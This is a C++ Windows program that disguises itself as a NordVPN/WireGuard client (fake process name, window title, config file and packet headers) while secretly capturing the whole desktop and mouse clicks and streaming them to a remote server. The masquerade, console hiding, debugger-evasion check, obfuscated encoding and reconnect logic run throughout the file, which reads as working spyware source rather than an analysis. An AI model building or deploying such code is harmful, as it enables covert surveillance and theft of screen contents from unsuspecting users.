#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <vector>
#include <algorithm>
#include <fstream>
#include <memory>
#include <cstdint>
#include <climits>
#include <mutex>
#include <iomanip>
#include <d3d11.h>
#include <dxgi1_2.h>

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mmsystem.h>

#define PROCESS_NAME "nordvpn.exe"
#define WINDOW_TITLE "NordVPN"

// Allow larger screen capture packets (up to 50MB) to prevent premature disconnects
static constexpr uint32_t MAX_PACKET_SIZE = 50 * 1024 * 1024;

class WireGuardEncoder {
private:
    static const std::string chars;
    
public:
    static std::string encode(const std::vector<BYTE>& input) {
        std::string result;
        int val = 0, valb = -6;
        for (BYTE c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }

    static std::vector<BYTE> decode(const std::string& input) {
        std::vector<int> T(256, -1);
        for (int i = 0; i < 64; i++) T[chars[i]] = i;
        
        std::vector<BYTE> result;
        int val = 0, valb = -8;
        for (unsigned char c : input) {
            if (T[c] == -1) break;
            val = (val << 6) + T[c];
            valb += 6;
            if (valb >= 0) {
                result.push_back((val >> valb) & 0xFF);
                valb -= 8;
            }
        }
        return result;
    }
};

const std::string WireGuardEncoder::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";

static std::string g_ip_default;
static std::string g_ip_result;

LRESULT CALLBACK InputWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit;
    switch (msg) {
    case WM_CREATE:
        hEdit = CreateWindowA("EDIT", g_ip_default.c_str(),
                              WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                              10, 10, 200, 20, hwnd, (HMENU)1, nullptr, nullptr);
        CreateWindowA("BUTTON", "OK",
                      WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                      220, 10, 60, 20, hwnd, (HMENU)IDOK, nullptr, nullptr);
        return 0;
    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK) {
            char buffer[256];
            GetWindowTextA(hEdit, buffer, sizeof(buffer));
            g_ip_result = buffer;
            DestroyWindow(hwnd);
            return 0;
        }
        break;
    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

static std::string PromptServerIP(const std::string& def) {
    g_ip_default = def;
    g_ip_result.clear();

    HINSTANCE hInst = GetModuleHandle(NULL);
    if (!hInst) {
        MessageBoxA(NULL, "GetModuleHandle failed", "Error", MB_OK);  // ← Remove L prefix
        return def;
    }

    WNDCLASSA wc{};
    wc.lpfnWndProc   = InputWndProc;
    wc.hInstance     = hInst;
    wc.lpszClassName = "IPInputClass";
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    
    if (!RegisterClassA(&wc)) {
        DWORD err = GetLastError();
        if (err != ERROR_CLASS_ALREADY_EXISTS) {
            MessageBoxA(NULL, ("RegisterClass failed: " + std::to_string(err)).c_str(), "Error", MB_OK);
            return def;
        }
    }

    HWND hwnd = CreateWindowExA(WS_EX_TOPMOST, "IPInputClass", "Server IP",
                                WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
                                100, 100, 300, 80, nullptr, nullptr, hInst, nullptr);

    if (!hwnd) {
        DWORD err = GetLastError();
        MessageBoxA(NULL, ("CreateWindow failed: " + std::to_string(err)).c_str(), "Error", MB_OK);
        UnregisterClassA("IPInputClass", hInst);
        return def;
    }

    ShowWindow(hwnd, SW_SHOWNORMAL);
    Sleep(500);
    UpdateWindow(hwnd);
    SetForegroundWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnregisterClassA("IPInputClass", hInst);
    if (g_ip_result.empty()) g_ip_result = def;
    return g_ip_result;
}


class ChaChaCompressor {
public:
    static std::vector<BYTE> compressRLE(const std::vector<BYTE>& data) {
        std::vector<BYTE> compressed;
        if (data.empty()) return compressed;
        
        for (size_t i = 0; i < data.size(); ) {
            BYTE current = data[i];
            BYTE count = 1;
            
            while (i + count < data.size() && data[i + count] == current && count < 255) {
                count++;
            }
            
            // Also encode literal 0xFF values to avoid sentinel conflicts
            if (count >= 3 || current == 0 || current == 0xFF) {
                compressed.push_back(0xFF);
                compressed.push_back(count);
                compressed.push_back(current);
            } else {
                for (BYTE j = 0; j < count; j++) {
                    compressed.push_back(current);
                }
            }
            i += count;
        }
        return compressed;
    }
};

struct WireGuardHeader {
    BYTE type;
    BYTE reserved[3];
    DWORD sender_index;
    ULONGLONG counter;
    BYTE nonce[12];
    
    WireGuardHeader() {
        type = 0x04;
        memset(reserved, 0, 3);
        sender_index = GetTickCount();
        counter = GetTickCount64();
        for (int i = 0; i < 12; i++) {
            nonce[i] = rand() % 256;
        }
    }
};

struct WireGuardPacket {
    WireGuardHeader header;
    std::vector<BYTE> encrypted_payload;
    BYTE auth_tag[16];
    
    WireGuardPacket(const std::vector<BYTE>& payload) {
        encrypted_payload = payload;
        for (int i = 0; i < 16; i++) {
            auth_tag[i] = rand() % 256;
        }
    }
    
    std::vector<BYTE> serialize() const {
        std::vector<BYTE> packet;
        packet.resize(sizeof(WireGuardHeader));
        memcpy(packet.data(), &header, sizeof(WireGuardHeader));
        
        packet.insert(packet.end(), encrypted_payload.begin(), encrypted_payload.end());
        packet.insert(packet.end(), auth_tag, auth_tag + 16);
        
        return packet;
    }
    
    static WireGuardPacket deserialize(const std::vector<BYTE>& data) {
        WireGuardPacket packet({});
        if (data.size() >= sizeof(WireGuardHeader) + 16) {
            memcpy(&packet.header, data.data(), sizeof(WireGuardHeader));
            
            size_t payload_size = data.size() - sizeof(WireGuardHeader) - 16;
            packet.encrypted_payload.assign(
                data.begin() + sizeof(WireGuardHeader),
                data.begin() + sizeof(WireGuardHeader) + payload_size
            );
            
            memcpy(packet.auth_tag, data.data() + data.size() - 16, 16);
        }
        return packet;
    }
};

class TunnelProtocol {
public:
    static std::string generateKey32() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        std::string key;
        for (int i = 0; i < 32; i++) {
            char hex[3];
            sprintf_s(hex, "%02x", dis(gen));
            key += hex;
        }
        return key;
    }
    
    static std::vector<BYTE> createTunnelPayload(const std::string& type, const std::string& data) {
        std::stringstream payload;
        payload << type << ":" << data;
        
        std::string payload_str = payload.str();
        std::vector<BYTE> result(payload_str.begin(), payload_str.end());
        
        while (result.size() % 16 != 0) {
            result.push_back(0x00);
        }
        
        return result;
    }
    
    static std::pair<std::string, std::string> extractTunnelPayload(const std::vector<BYTE>& payload) {
        std::string data(payload.begin(), payload.end());
        size_t colon_pos = data.find(':');
        if (colon_pos != std::string::npos) {
            std::string type = data.substr(0, colon_pos);
            std::string value = data.substr(colon_pos + 1);
            value.erase(std::find_if(value.rbegin(), value.rend(), [](unsigned char ch) {
                return ch != '\0';
            }).base(), value.end());
            return {type, value};
        }
        return {"", ""};
    }
};

class WireGuardCapture {
private:
    int screen_width;
    int screen_height;
    ID3D11Device* device;
    ID3D11DeviceContext* context;
    IDXGIOutputDuplication* duplication;
    ID3D11Texture2D* staging_texture;
    
    // Direct memory buffers
    BYTE* raw_buffer;
    SIZE_T buffer_size;
    HANDLE memory_section;
    
public:
    WireGuardCapture() : screen_width(0), screen_height(0), 
                        device(nullptr), context(nullptr), 
                        duplication(nullptr), staging_texture(nullptr),
                        raw_buffer(nullptr), buffer_size(0), memory_section(nullptr) {}
    
    ~WireGuardCapture() {
        cleanup();
    }
    
private:
    void drawCursor(int x, int y) {
        CURSORINFO ci = {sizeof(CURSORINFO)};
        if (!GetCursorInfo(&ci) || ci.flags != CURSOR_SHOWING) return;
        
        ICONINFO ii;
        if (!GetIconInfo(ci.hCursor, &ii)) return;
        
        // Adjust position by hotspot
        int cursor_x = x - static_cast<int>(ii.xHotspot);
        int cursor_y = y - static_cast<int>(ii.yHotspot);
        
        // Get cursor bitmap info
        BITMAP bmp;
        if (GetObject(ii.hbmColor ? ii.hbmColor : ii.hbmMask, sizeof(bmp), &bmp) == 0) {
            if (ii.hbmMask) DeleteObject(ii.hbmMask);
            if (ii.hbmColor) DeleteObject(ii.hbmColor);
            return;
        }
        
        // Create compatible DC for cursor
        HDC cursor_dc = CreateCompatibleDC(nullptr);
        HBITMAP old_bmp = static_cast<HBITMAP>(SelectObject(cursor_dc, ii.hbmColor ? ii.hbmColor : ii.hbmMask));
        
        // Get cursor pixel data
        BITMAPINFO cursor_bmi = {0};
        cursor_bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        cursor_bmi.bmiHeader.biWidth = bmp.bmWidth;
        cursor_bmi.bmiHeader.biHeight = -bmp.bmHeight;
        cursor_bmi.bmiHeader.biPlanes = 1;
        cursor_bmi.bmiHeader.biBitCount = 32;
        cursor_bmi.bmiHeader.biCompression = BI_RGB;
        
        std::vector<DWORD> cursor_pixels(bmp.bmWidth * bmp.bmHeight);
        GetDIBits(cursor_dc, ii.hbmColor ? ii.hbmColor : ii.hbmMask, 0, bmp.bmHeight, 
                 cursor_pixels.data(), &cursor_bmi, DIB_RGB_COLORS);
        
        // Blend cursor onto framebuffer
        for (int cy = 0; cy < bmp.bmHeight; ++cy) {
            for (int cx = 0; cx < bmp.bmWidth; ++cx) {
                int screen_x = cursor_x + cx;
                int screen_y = cursor_y + cy;
                
                if (screen_x >= 0 && screen_x < screen_width && screen_y >= 0 && screen_y < screen_height) {
                    DWORD cursor_pixel = cursor_pixels[cy * bmp.bmWidth + cx];
                    BYTE alpha = (cursor_pixel >> 24) & 0xFF;
                    
                    if (alpha > 0) {
                        BYTE* dst = raw_buffer + (static_cast<SIZE_T>(screen_y) * screen_width + screen_x) * 3;
                        BYTE cursor_r = (cursor_pixel >> 16) & 0xFF;
                        BYTE cursor_g = (cursor_pixel >> 8) & 0xFF;
                        BYTE cursor_b = cursor_pixel & 0xFF;
                        
                        if (alpha == 255) {
                            // Opaque pixel
                            dst[0] = cursor_r;
                            dst[1] = cursor_g;
                            dst[2] = cursor_b;
                        } else {
                            // Alpha blend
                            dst[0] = (cursor_r * alpha + dst[0] * (255 - alpha)) / 255;
                            dst[1] = (cursor_g * alpha + dst[1] * (255 - alpha)) / 255;
                            dst[2] = (cursor_b * alpha + dst[2] * (255 - alpha)) / 255;
                        }
                    }
                }
            }
        }
        
        SelectObject(cursor_dc, old_bmp);
        DeleteDC(cursor_dc);
        if (ii.hbmMask) DeleteObject(ii.hbmMask);
        if (ii.hbmColor) DeleteObject(ii.hbmColor);
    }
    
public:
    
    bool initialize() {
        // Create D3D11 device with minimal overhead
        D3D_FEATURE_LEVEL featureLevel;
        HRESULT hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 
                                      D3D11_CREATE_DEVICE_SINGLETHREADED, // No thread safety overhead
                                      nullptr, 0, D3D11_SDK_VERSION, 
                                      &device, &featureLevel, &context);
        if (FAILED(hr)) return false;
        
        // Get DXGI objects with direct interface queries
        IDXGIDevice* dxgiDevice;
        device->QueryInterface(IID_PPV_ARGS(&dxgiDevice));
        
        IDXGIAdapter* adapter;
        dxgiDevice->GetAdapter(&adapter);
        dxgiDevice->Release();
        
        IDXGIOutput* output;
        adapter->EnumOutputs(0, &output);
        adapter->Release();
        
        IDXGIOutput1* output1;
        output->QueryInterface(IID_PPV_ARGS(&output1));
        output->Release();
        
        // Create duplication interface (this is the actual low-level GPU access)
        hr = output1->DuplicateOutput(device, &duplication);
        output1->Release();
        if (FAILED(hr)) return false;
        
        // Get screen dimensions
        DXGI_OUTDUPL_DESC desc;
        duplication->GetDesc(&desc);
        screen_width = desc.ModeDesc.Width;
        screen_height = desc.ModeDesc.Height;
        
        // Create staging texture with CPU_ACCESS_READ for direct memory mapping
        D3D11_TEXTURE2D_DESC textureDesc = {};
        textureDesc.Width = screen_width;
        textureDesc.Height = screen_height;
        textureDesc.MipLevels = 1;
        textureDesc.ArraySize = 1;
        textureDesc.Format = DXGI_FORMAT_B8G8R8A8_UNORM;
        textureDesc.SampleDesc.Count = 1;
        textureDesc.Usage = D3D11_USAGE_STAGING;
        textureDesc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
        textureDesc.BindFlags = 0;
        
        hr = device->CreateTexture2D(&textureDesc, nullptr, &staging_texture);
        if (FAILED(hr)) return false;
        
        // Create direct memory section for zero-copy operations
        buffer_size = static_cast<SIZE_T>(screen_width) * screen_height * 3;
        memory_section = CreateFileMapping(INVALID_HANDLE_VALUE, nullptr, 
                                         PAGE_READWRITE | SEC_COMMIT, 
                                         0, static_cast<DWORD>(buffer_size), nullptr);
        if (!memory_section) return false;
        
        raw_buffer = static_cast<BYTE*>(MapViewOfFile(memory_section, 
                                                     FILE_MAP_ALL_ACCESS, 
                                                     0, 0, buffer_size));
        return raw_buffer != nullptr;
    }
    
    // Returns direct pointer to memory buffer - zero copy
    BYTE* captureFrameDirect() {
        IDXGIResource* desktopResource;
        DXGI_OUTDUPL_FRAME_INFO frameInfo;
        
        // Acquire frame directly from GPU memory
        HRESULT hr = duplication->AcquireNextFrame(16, &frameInfo, &desktopResource);
        if (FAILED(hr)) return nullptr;
        
        // Get texture interface
        ID3D11Texture2D* desktopTexture;
        desktopResource->QueryInterface(IID_PPV_ARGS(&desktopTexture));
        desktopResource->Release();
        
        // Direct GPU->CPU memory copy
        context->CopyResource(staging_texture, desktopTexture);
        desktopTexture->Release();
        
        // Map GPU memory directly to CPU addressable space
        D3D11_MAPPED_SUBRESOURCE mapped;
        hr = context->Map(staging_texture, 0, D3D11_MAP_READ, D3D11_MAP_FLAG_DO_NOT_WAIT, &mapped);
        if (FAILED(hr)) {
            duplication->ReleaseFrame();
            return nullptr;
        }
        
        // Direct memory operations - raw pointer arithmetic
        BYTE* gpu_memory = static_cast<BYTE*>(mapped.pData);
        BYTE* output_ptr = raw_buffer;
        
        // Optimized memory conversion loop with direct pointer access
        for (int y = 0; y < screen_height; ++y) {
            DWORD* src_row = reinterpret_cast<DWORD*>(gpu_memory + static_cast<SIZE_T>(y) * mapped.RowPitch);
            BYTE* dst_row = output_ptr + static_cast<SIZE_T>(y) * screen_width * 3;
            
            // Process 4 pixels at once when possible for better cache usage
            int x = 0;
            for (; x < screen_width - 3; x += 4) {
                // Load 4 BGRA pixels as 128-bit
                DWORD p1 = src_row[x];
                DWORD p2 = src_row[x + 1];
                DWORD p3 = src_row[x + 2];
                DWORD p4 = src_row[x + 3];
                
                // Extract RGB components with bit manipulation
                BYTE* dst = dst_row + x * 3;
                
                // Pixel 1
                dst[0] = (p1 >> 16) & 0xFF; // R
                dst[1] = (p1 >> 8) & 0xFF;  // G
                dst[2] = p1 & 0xFF;         // B
                
                // Pixel 2
                dst[3] = (p2 >> 16) & 0xFF;
                dst[4] = (p2 >> 8) & 0xFF;
                dst[5] = p2 & 0xFF;
                
                // Pixel 3
                dst[6] = (p3 >> 16) & 0xFF;
                dst[7] = (p3 >> 8) & 0xFF;
                dst[8] = p3 & 0xFF;
                
                // Pixel 4
                dst[9] = (p4 >> 16) & 0xFF;
                dst[10] = (p4 >> 8) & 0xFF;
                dst[11] = p4 & 0xFF;
            }
            
            // Handle remaining pixels
            for (; x < screen_width; ++x) {
                DWORD pixel = src_row[x];
                BYTE* dst = dst_row + x * 3;
                dst[0] = (pixel >> 16) & 0xFF; // R
                dst[1] = (pixel >> 8) & 0xFF;  // G
                dst[2] = pixel & 0xFF;         // B
            }
        }
        
        context->Unmap(staging_texture, 0);
        duplication->ReleaseFrame();
        
        return raw_buffer;
    }
    
    // Standard vector interface for compatibility
    std::vector<BYTE> captureFrame() {
        BYTE* direct_buffer = captureFrameDirect();
        if (!direct_buffer) return {};
        
        // Return vector that wraps our memory without copying
        return std::vector<BYTE>(direct_buffer, direct_buffer + buffer_size);
    }
    
    // Access raw memory buffer properties
    BYTE* getRawBuffer() const { return raw_buffer; }
    SIZE_T getBufferSize() const { return buffer_size; }
    
    void cleanup() {
        if (raw_buffer) { 
            UnmapViewOfFile(raw_buffer); 
            raw_buffer = nullptr; 
        }
        if (memory_section) { 
            CloseHandle(memory_section); 
            memory_section = nullptr; 
        }
        if (staging_texture) { 
            staging_texture->Release(); 
            staging_texture = nullptr; 
        }
        if (duplication) { 
            duplication->Release(); 
            duplication = nullptr; 
        }
        if (context) { 
            context->Release(); 
            context = nullptr; 
        }
        if (device) { 
            device->Release(); 
            device = nullptr; 
        }
    }
    
    int getWidth() const { return screen_width; }
    int getHeight() const { return screen_height; }
};

class TunnelStealth {
public:
    static void hideFromProcessList() {
        SetConsoleTitleA(WINDOW_TITLE);
        
        HWND consoleWindow = GetConsoleWindow();
        if (consoleWindow) {
            Sleep(500);
            ShowWindow(consoleWindow, SW_HIDE);
            Sleep(500);
        }
    }
    
    static void setProcessName(const char* name) {
        SetConsoleTitleA(name);
    }
    
    static bool isDebuggerPresent() {
        return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), nullptr);
    }
    
    static void createWireGuardConfig(const std::string& host, int port) {
        std::string appData = getenv("APPDATA");
        std::string nordDir = appData + "\\NordVPN";

        CreateDirectoryA(nordDir.c_str(), nullptr);

        std::ofstream config(nordDir + "\\nordlynx.conf");
        if (config.is_open()) {
            config << "[Interface]\n";
            config << "PrivateKey = " << TunnelProtocol::generateKey32() << "\n";
            config << "Address = 10.5.0.2/32\n";
            config << "DNS = 103.86.96.100\n";
            config << "\n[Peer]\n";
            config << "PublicKey = " << TunnelProtocol::generateKey32() << "\n";
            config << "AllowedIPs = 0.0.0.0/0\n";
            config << "Endpoint = " << host << ":" << port << "\n";
            config.close();
        }
    }
};

class WireGuardClient {
private:
    std::string server_host;
    int server_port;
    std::string session_id;
    std::random_device rd;
    std::mt19937 gen;
    SOCKET tcp_socket;
    
    WireGuardCapture screen_capture;
    std::vector<BYTE> last_frame_data;
    
    static bool sendAll(SOCKET s, const char* data, size_t len) {
        size_t sent = 0;
        while (sent < len) {
            int ret = send(s, data + sent, static_cast<int>(std::min<size_t>(len - sent, INT_MAX)), 0);
            if (ret <= 0) {
                return false;
            }
            sent += static_cast<size_t>(ret);
        }
        return true;
    }

    static bool recvAll(SOCKET s, char* data, size_t len) {
        size_t received = 0;
        while (received < len) {
            int ret = recv(s, data + received, static_cast<int>(std::min<size_t>(len - received, INT_MAX)), 0);
            if (ret <= 0) {
                return false;
            }
            received += static_cast<size_t>(ret);
        }
        return true;
    }

    bool sendWireGuardPacket(const WireGuardPacket& packet) {
        if (tcp_socket == INVALID_SOCKET) return false;

        std::vector<BYTE> packet_data = packet.serialize();
        uint32_t len = static_cast<uint32_t>(packet_data.size());
        char len_buf[4] = {
            static_cast<char>((len >> 24) & 0xFF),
            static_cast<char>((len >> 16) & 0xFF),
            static_cast<char>((len >> 8) & 0xFF),
            static_cast<char>(len & 0xFF)
        };
        if (!sendAll(tcp_socket, len_buf, sizeof(len_buf))) {
            return false;
        }
        if (!sendAll(tcp_socket, reinterpret_cast<const char*>(packet_data.data()), packet_data.size())) {
            return false;
        }
        return true;
    }

    WireGuardPacket receiveWireGuardPacket() {
        char len_buf[4];
        if (!recvAll(tcp_socket, len_buf, sizeof(len_buf))) {
            return WireGuardPacket({});
        }
        uint32_t len =
            (static_cast<uint8_t>(len_buf[0]) << 24) |
            (static_cast<uint8_t>(len_buf[1]) << 16) |
            (static_cast<uint8_t>(len_buf[2]) << 8)  |
            (static_cast<uint8_t>(len_buf[3]));
        if (len == 0 || len > MAX_PACKET_SIZE) {
            return WireGuardPacket({});
        }
        std::vector<BYTE> data(len);
        if (!recvAll(tcp_socket, reinterpret_cast<char*>(data.data()), len)) {
            return WireGuardPacket({});
        }
        return WireGuardPacket::deserialize(data);
    }
    
public:
    WireGuardClient(const std::string& host, int port)
        : server_host(host), server_port(port), gen(rd()), tcp_socket(INVALID_SOCKET) {}

    bool initializeConnection() {
        addrinfo hints{};
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        addrinfo* result = nullptr;
        std::string port_str = std::to_string(server_port);
      
        int ret = getaddrinfo(server_host.c_str(), port_str.c_str(), &hints, &result);
        if (ret == 0) {
            for (addrinfo* rp = result; rp != nullptr; rp = rp->ai_next) {
                tcp_socket = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (tcp_socket == INVALID_SOCKET) continue;

                if (connect(tcp_socket, rp->ai_addr, static_cast<int>(rp->ai_addrlen)) != SOCKET_ERROR) {
                    break;
                }

                closesocket(tcp_socket);
                tcp_socket = INVALID_SOCKET;
            }
            freeaddrinfo(result);
        } else {
        }

        if (tcp_socket == INVALID_SOCKET) {
            sockaddr_in addr{};
            addr.sin_family = AF_INET;
            addr.sin_port = htons(server_port);
            if (inet_pton(AF_INET, server_host.c_str(), &addr.sin_addr) != 1) {
                return false;
            }
            tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (tcp_socket != INVALID_SOCKET &&
                connect(tcp_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
                closesocket(tcp_socket);
                tcp_socket = INVALID_SOCKET;
            }
        }

        if (tcp_socket == INVALID_SOCKET) {
            int alt_port = (server_port == 1194) ? 443 : 1194;
            addrinfo* result = nullptr;
            if (getaddrinfo(server_host.c_str(), std::to_string(alt_port).c_str(), &hints, &result) == 0) {
                for (addrinfo* rp = result; rp != nullptr; rp = rp->ai_next) {
                    tcp_socket = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                    if (tcp_socket == INVALID_SOCKET) continue;
                    if (connect(tcp_socket, rp->ai_addr, static_cast<int>(rp->ai_addrlen)) != SOCKET_ERROR) {
                        break;
                    }
                    closesocket(tcp_socket);
                    tcp_socket = INVALID_SOCKET;
                }
                freeaddrinfo(result);
            }
            if (tcp_socket == INVALID_SOCKET) {
                sockaddr_in addr{};
                addr.sin_family = AF_INET;
                addr.sin_port = htons(alt_port);
                if (inet_pton(AF_INET, server_host.c_str(), &addr.sin_addr) == 1) {
                    tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (tcp_socket != INVALID_SOCKET &&
                        connect(tcp_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
                        closesocket(tcp_socket);
                        tcp_socket = INVALID_SOCKET;
                    }
                }
            }
            if (tcp_socket != INVALID_SOCKET) {
                server_port = alt_port;
            } else {
                return false;
            }
        }

        if (tcp_socket == INVALID_SOCKET) {
            return false;
        }

        DWORD timeout = 5000;
      
        setsockopt(tcp_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

        std::vector<BYTE> handshake_payload = TunnelProtocol::createTunnelPayload("handshake", "initiation");
        WireGuardPacket handshake(handshake_payload);

        if (!sendWireGuardPacket(handshake)) {
            return false;
        }

        WireGuardPacket response = receiveWireGuardPacket();
        auto [type, data] = TunnelProtocol::extractTunnelPayload(response.encrypted_payload);

        if (type == "session") {
            session_id = data;
            return true;
        }
        return false;
    }
    
    void sendDesktopFrame() {
        std::vector<BYTE> frameData = screen_capture.captureFrame();

        if (frameData.empty()) {
            return;
        }

        int width = screen_capture.getWidth();
        int height = screen_capture.getHeight();
        const int bpp = 3;

        bool sendFull = last_frame_data.size() != frameData.size();
        int x = 0, y = 0, w = width, h = height;

        if (!sendFull) {
            int min_x = width, min_y = height, max_x = -1, max_y = -1;
            for (int yy = 0; yy < height; ++yy) {
                for (int xx = 0; xx < width; ++xx) {
                    size_t idx = (static_cast<size_t>(yy) * width + xx) * bpp;
                    if (frameData[idx] != last_frame_data[idx] ||
                        frameData[idx + 1] != last_frame_data[idx + 1] ||
                        frameData[idx + 2] != last_frame_data[idx + 2]) {
                        if (xx < min_x) min_x = xx;
                        if (yy < min_y) min_y = yy;
                        if (xx > max_x) max_x = xx;
                        if (yy > max_y) max_y = yy;
                    }
                }
            }

            if (max_x >= min_x && max_y >= min_y) {
                x = min_x;
                y = min_y;
                w = max_x - min_x + 1;
                h = max_y - min_y + 1;
            } else {
                return; // No changes
            }
        }

        std::vector<BYTE> region;
        region.reserve(static_cast<size_t>(w) * h * bpp);
        for (int row = 0; row < h; ++row) {
            size_t src = (static_cast<size_t>(y + row) * width + x) * bpp;
            region.insert(region.end(),
                          frameData.begin() + src,
                          frameData.begin() + src + static_cast<size_t>(w) * bpp);
        }

        std::vector<BYTE> compressed = ChaChaCompressor::compressRLE(region);
        std::string encoded = WireGuardEncoder::encode(compressed);

        std::stringstream payload;
        payload << session_id << "|";
        payload << width << "x" << height << "|";
        payload << x << "," << y << "," << w << "," << h << "|";
        payload << encoded;

        std::vector<BYTE> tunnel_payload = TunnelProtocol::createTunnelPayload("screen", payload.str());
        WireGuardPacket packet(tunnel_payload);

        if (sendWireGuardPacket(packet)) {
            last_frame_data = frameData;
        } else {
        }
    }

    void sendMouseEvent(const std::string& evt) {
        if (session_id.empty()) return;
        std::stringstream payload;
        payload << session_id << "|" << evt;
        std::vector<BYTE> tp = TunnelProtocol::createTunnelPayload("event", payload.str());
        WireGuardPacket packet(tp);
        sendWireGuardPacket(packet);
    }

    void detectAndSendMouseEvents() {
        // middle click handling removed

        static bool leftHeld = false;
        static std::chrono::steady_clock::time_point leftDownTime;
        static POINT leftPos{0,0};

        static bool rightHeld = false;
        static std::chrono::steady_clock::time_point rightDownTime;

        auto now = std::chrono::steady_clock::now();

        // LEFT BUTTON: long press -> send long_left:x,y (for trim anchor)
        SHORT leftState = GetAsyncKeyState(VK_LBUTTON);
        bool leftDown = (leftState & 0x8000) != 0;
        if (leftDown && !leftHeld) {
            leftHeld = true;
            leftDownTime = now;
            GetCursorPos(&leftPos);
        }
        if (!leftDown && leftHeld) {
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - leftDownTime).count();
            if (duration > 800) {
                std::ostringstream ss;
                ss << "long_left:" << leftPos.x << "," << leftPos.y;
                sendMouseEvent(ss.str());
            }
            leftHeld = false;
        }

        // RIGHT BUTTON: short click -> right (screenshot), long press -> long_right (toggle view)
        SHORT rightState = GetAsyncKeyState(VK_RBUTTON);
        bool rightDown = (rightState & 0x8000) != 0;
        if (rightDown && !rightHeld) {
            rightHeld = true;
            rightDownTime = now;
        }
        if (!rightDown && rightHeld) {
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - rightDownTime).count();
            if (duration > 800) {
                sendMouseEvent("long_right");
            } else {
                sendMouseEvent("right");
            }
            rightHeld = false;
        }

        // no middle-button behavior
    }
    
    void run() {
        TunnelStealth::hideFromProcessList();

        if (TunnelStealth::isDebuggerPresent()) {
            return;
        }

        if (!screen_capture.initialize()) {
            return;
        }
        while (true) {
            try {
                if (initializeConnection()) {
                    TunnelStealth::createWireGuardConfig(server_host, server_port);
                    while (true) {
                        sendDesktopFrame();
                        detectAndSendMouseEvents();
                        
                        // Wait ~16ms but wake immediately on mouse input
                        MSG msg;
                        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                            TranslateMessage(&msg);
                            DispatchMessage(&msg);
                        }
                        MsgWaitForMultipleObjects(0, NULL, FALSE, 16, QS_MOUSE);
                        
                        static int health_check = 0;
                        if (++health_check % 2000 == 0) {
                            std::vector<BYTE> keepalive_payload = TunnelProtocol::createTunnelPayload("keepalive", "ping");
                            WireGuardPacket keepalive(keepalive_payload);
                            if (!sendWireGuardPacket(keepalive)) {
                                break;
                            }
                        }
                    }
                }

                if (tcp_socket != INVALID_SOCKET) {
                    closesocket(tcp_socket);
                    tcp_socket = INVALID_SOCKET;
                }
                std::this_thread::sleep_for(std::chrono::seconds(30));

            } catch (...) {
                std::this_thread::sleep_for(std::chrono::seconds(10));
            }
        }
    }
    
    ~WireGuardClient() {
        if (tcp_socket != INVALID_SOCKET) {
            closesocket(tcp_socket);
        }
    }
};

int main(int argc, char* argv[]) {
    std::string host = "192.168.88.100";
    int port = 1194;
    bool hostProvided = false;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--https") {
            port = 443;
        } else if (!hostProvided) {
            host = arg;
            hostProvided = true;
        } else {
            port = std::stoi(arg);
        }
    }

    // Prompt the user for the server IP before hiding the console
    host = PromptServerIP(host);

    // Hide and detach any console window so the client runs in the background
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    FreeConsole();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    WireGuardClient client(host, port);
    client.run();

    WSACleanup();
    return 0;
}
